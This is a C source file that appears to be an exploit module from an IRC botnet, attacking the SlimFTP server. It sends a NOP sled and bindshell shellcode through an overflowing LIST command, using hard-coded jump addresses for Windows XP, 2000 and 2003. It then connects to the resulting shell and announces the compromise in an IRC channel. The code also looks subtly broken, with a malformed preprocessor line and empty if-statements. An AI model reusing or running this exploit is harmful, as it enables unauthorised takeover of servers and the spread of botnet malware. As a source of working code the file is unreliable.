/* SlimFTP Exploit */

#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

ifndef NO_SLIMFTP


#define USERNAME   "anonymous"
#define PASSWORD   "log@in.net"

#define NOP         0x90   
#define BUFSIZE         2048

char *login[] = { "USER "USERNAME"\r\n", "PASS "PASSWORD"\r\n", "LIST ", "XMKD AAAAAAAA\r\n", "CWD AAAAAAAA\r\n", NULL };

unsigned long offsets[]=
{
   // jmp esi
   0x71a5b80b, // Windows XP 5.1.1.0 SP1 (IA32) Windows XP 5.1.0.0 SP0 (IA32)
   0x77f1a322, // Windows XP 5.1.2.0 SP2 (IA32)
   0x74ffbb65, // Windows 2000 5.0.1.0 SP1 (IA32) Windows 2000 5.0.4.0 SP4 (IA32)
   0x77f7fe67, // Windows 2003 Server 5.2.1.0 SP1 (IA32)
   0x44434241,
   0
};


BOOL SlimFTP(EXINFO exinfo)
{

   BOOL success = FALSE;
   char buffer[IRCLINE];
   char expbuff[BUFSIZE];
   char recvbuff[BUFSIZE];
   void *p;
   unsigned short port;
   int len,i=0;
   int ftpbindsize=405;

   SOCKET sock;
   SOCKADDR_IN slim_addr;

   WSADATA wsadata;
   fWSAStartup(MAKEWORD(2,0), &wsadata);

   if ((sock=fsocket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0)
   WSACleanup();

   memset(&slim_addr,0x00,sizeof(slim_addr));
   slim_addr.sin_family = AF_INET;
   slim_addr.sin_addr.s_addr = finet_addr(exinfo.ip);
   slim_addr.sin_port = fhtons((unsigned short)exinfo.port);

   memset(expbuff, 0x00, BUFSIZE);
   memset(recvbuff, 0x00, BUFSIZE);
   memcpy(expbuff, login[2], strlen(login[2]));
   p =  &expbuff[strlen(login[2]) ];
   memset(p, NOP, 525);
   port = fhtons(BIND_PORT)^(USHORT)0x9999;
   memcpy(&bindshell[176],&port,2);
   memcpy(p,bindshell,ftpbindsize-1);

   *(unsigned long *)&expbuff[507] = ((unsigned int)offsets);
   p =  &expbuff[511];
   memcpy(p, "\n",1);

   if (fconnect(sock,(struct sockaddr*)&slim_addr,sizeof(slim_addr))!=0)
   WSACleanup();

   len = frecv(sock, recvbuff, BUFSIZE-1, 0);
   if(len < 0)

   if(fsend(sock,login[0],strlen(login[0]),0)==-1)
   WSACleanup();

   len = frecv(sock, recvbuff, BUFSIZE-1,0);
   if(len < 0)

   recvbuff[len] = 0;


   if(fsend(sock,login[1],strlen(login[1]),0)==-1)
   WSACleanup();

   len = frecv(sock, recvbuff, BUFSIZE, 0);
   if(len < 0)

   recvbuff[len] = 0;

   if(fsend(sock,login[3],strlen(login[3]),0)==-1)
   WSACleanup();

   len = frecv(sock, recvbuff, BUFSIZE, 0);
   if(len < 0)

   recvbuff[len] = 0;

   if(fsend(sock,login[4],strlen(login[4]),0)==-1)
   WSACleanup();

   len = frecv(sock, recvbuff, BUFSIZE, 0);
   if(len < 0)

   recvbuff[len] = 0;

   if(fsend(sock,expbuff,strlen(expbuff),0)==-1)
   WSACleanup();

   fclosesocket(sock);
   fWSACleanup();

   if (success)
   {
      if (ConnectShell(exinfo,BIND_PORT))
      {
         _snprintf(buffer, sizeof(buffer), "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
         if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
         exploit[exinfo.exploit].stats++;
      }
   }
   return TRUE;
}
#endif 

